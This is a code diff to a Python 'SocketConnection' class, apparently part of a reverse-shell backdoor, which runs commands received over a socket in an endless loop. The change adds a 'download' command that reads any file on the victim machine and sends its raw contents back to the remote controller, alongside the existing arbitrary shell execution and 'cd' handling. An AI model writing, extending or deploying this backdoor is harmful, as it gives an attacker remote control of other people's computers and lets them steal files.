@@ -33,6 +33,11 @@ class SocketConnection:
         os.chdir(directory)
         return "cd \\" + directory
 
+    # Getting file contents
+    def getting_file_contents(self,path):
+        with open(path, "rb") as my_file:
+            return my_file.read()
+
     def start_socket(self):
         while True: # Create infinite loop of execution of commands
             command = self.json_receive()
@@ -41,7 +46,9 @@ class SocketConnection:
                exit()
             elif command[0] == "cd" and len(command) > 1:
                 command_output = self.cd_command(command[1])
-            else: 
+            elif command[0] == "download":
+                command_output = self.getting_file_contents(command[1])
+            else:
                 command_output = self.command_execution(command).decode()
             self.json_send(command_output)
         self.connection.close()
